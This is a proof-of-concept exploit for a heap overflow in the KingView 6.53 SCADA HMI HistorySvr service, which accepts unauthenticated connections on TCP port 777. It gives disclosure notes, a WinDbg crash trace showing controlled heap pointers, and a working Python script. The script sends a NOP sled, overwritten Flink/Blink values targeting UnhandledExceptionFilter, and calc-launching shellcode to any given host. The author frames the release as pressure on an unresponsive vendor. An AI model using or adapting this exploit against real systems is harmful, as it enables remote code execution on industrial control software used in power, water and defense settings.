## Exploit Title: KingView 6.53 SCADA HMI Heap Overflow PoC
## Date: 9/28/2010
## Author: Dillon Beresford
## Software Link: http://download.kingview.com/software/kingview%20English%20Version/kingview6.53_EN.rar
## Version: 6.53 (English)
## Tested on: Windows XP SP1 ( works on SP2 and SP3 ) will release new targets after CERT advisory is public. 

## Shouts to HD Moore JDuck, Egyp7, todb, |)ruid, nate and the rest of the AHA! crew.
## Thanks to all who share knowledge about heap smashing and heap bypass techniques.

## Notified CERT and the vendor, CERT notified the vendor as well, vendor never responded.
## No patch or response from vendor as of 1/9/2011
## Lets get this into the wild and see how long it takes them to respond.

## Looks like persistence pays off. :-)

## SP2/SP3 targets will be available soon. (putting into metasploit this is just a poc to get response from vendor).
## Vendor: Beijing WellinControl Technology Development Co.,Ltd 
## http://www.wellintek.com

## Beijing WellinControl Technology Development and CHINA CERT were notified on Tue, Sep 28, 2010 at 6:31 AM
## I have made every attempt and yet they choose to ignore...
## This PoC should wake up the dragon. >:-]
## With more to come!

## KingView software is a high-pormance production which can be used to building a data information 
## service platform in automatic field. KingView software can provid graphic visualization which takes 
## your operations management, control and optimization . KingView is widely used in power, 
## water conservancy,buildings, coalmine, environmental protection, metallurgy and so on. 
## And now KingView software is used in national defense, Aero-Space in China. 

## Notes: The HistorySrv process listens on TCP port 777 
## This process does not require any authentication from clients

## An attacker could replace the Flink and Blink pointers with evil ones.. Herrow srweeping dragon. 

## Windows XP SP1 (x86) 
## CommandLine: "C:\Program Files\Kingview\HistorySvr.exe"
## eax=00241eb4 ebx=7ffdf000 ecx=00000003 edx=77f6eb08 esi=00241eb4 edi=00241f48
## eip=77f767cd esp=0012fb38 ebp=0012fc2c iopl=0         nv up ei pl nz na po nc
## cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
## ntdll!DbgBreakPoint:
## 77f767cd cc              int     3
## 0:000> g
## ModLoad: 71950000 71a34000   C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.10.0_x-ww_f7fb5805\comctl32.dll
## ModLoad: 5ad70000 5ada4000   C:\WINDOWS\System32\uxtheme.dll
## ModLoad: 71a50000 71a8b000   C:\WINDOWS\system32\mswsock.dll
## ModLoad: 71a90000 71a98000   C:\WINDOWS\System32\wshtcpip.dll
## (318.6d4): Access violation - code c0000005 (first chance)
## First chance exceptions are reported before any exception handling.
## This exception may be expected and handled.
## eax=42424242 ebx=00000285 ecx=44444444 edx=00d38110 esi=00d38110 edi=003a0000
## eip=77f6256f esp=0012f36c ebp=0012f584 iopl=0         nv up ei pl zr na pe nc
## cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00010246
## ntdll!RtlAllocateHeapSlowly+0x6bd:
## 77f6256f 8901            mov     dword ptr [ecx],eax  ds:0023:44444444=????????
## 0:000> u
## ntdll!RtlAllocateHeapSlowly+0x6bd:
## 77f6256f 8901            mov     dword ptr [ecx],eax
## 77f62571 894804          mov     dword ptr [eax+4],ecx
## 77f62574 3bc1            cmp     eax,ecx
## 77f62576 7534            jne     ntdll!RtlAllocateHeapSlowly+0x6fa (77f625ac)
## 77f62578 668b06          mov     ax,word ptr [esi]
## 77f6257b 663d8000        cmp     ax,80h
## 77f6257f 732b            jae     ntdll!RtlAllocateHeapSlowly+0x6fa (77f625ac)
## 77f62581 0fb7c8          movzx   ecx,ax


## usage python exploit.py 127.0.0.1 777

import os
import socket
import sys

host = sys.argv[1]
port = int(sys.argv[2])

print " KingView 6.53 SCADA HMI Heap Smashing Exploit "
print " Credits: D1N | twitter.com/D1N "

shellcode = ("\x33\xC0\x50\x68\x63\x61\x6C\x63\x54\x5B\x50\x53\xB9"
"\x44\x80\xc2\x77" 
"\xFF\xD1\x90\x90") 

exploit = ("\x90" * 1024 + "\x44" * 31788) 
exploit += ("\xeb\x14") # our JMP (over the junk and into nops) 
exploit += ("\x44" * 6) 
exploit += ("\xad\xbb\xc3\x77") # ECX 0x77C3BBAD --> call dword ptr ds:[EDI+74] 
exploit += ("\xb4\x73\xed\x77") # EAX 0x77ED73B4 --> UnhandledExceptionFilter() 
exploit += ("\x90" * 21) 
exploit += shellcode

print "  [+] Herrow Sweeping Dragon..."
print "  [+] Sending payload..."

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
s.connect((host,port)) 
s.send(exploit)  
data = s.recv(1024)

print "  [+] Closing connection.." 
s.close()  
print "  [+] Done!" 